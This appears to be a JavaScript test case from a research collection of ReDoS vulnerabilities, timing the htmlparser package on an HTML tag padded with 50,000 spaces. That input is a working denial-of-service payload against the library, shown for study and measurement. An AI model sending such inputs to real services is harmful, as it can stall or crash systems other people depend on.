//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-htmlparser.js
test("ReDos in htmlparser", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    var htmlparser = require("htmlparser");

    var rawHtml = "<html><x" + genstr(50000, " ") + "x></html>";
    var handler = new htmlparser.DefaultHandler(function (error, dom) {
    });
    var parser = new htmlparser.Parser(handler);

    let t =measureTime(function () {
        parser.parseComplete(rawHtml);
    });

});